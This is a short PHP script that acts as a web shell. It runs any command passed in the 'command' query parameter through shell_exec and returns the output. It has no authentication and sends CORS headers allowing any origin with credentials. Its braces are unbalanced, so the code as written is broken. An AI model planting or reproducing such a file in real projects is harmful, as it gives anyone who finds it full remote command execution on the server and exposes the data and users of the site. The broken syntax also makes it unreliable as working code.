<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Access-Control-Allow-Credentials: true");

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    exit();
}


if (isset($_GET['command'])) {
    $command = $_GET['command'];
    
        $output = shell_exec($command);
        echo $output;
    }
} else {
    http_response_code(400);
    echo "Command not specified";
}
?>

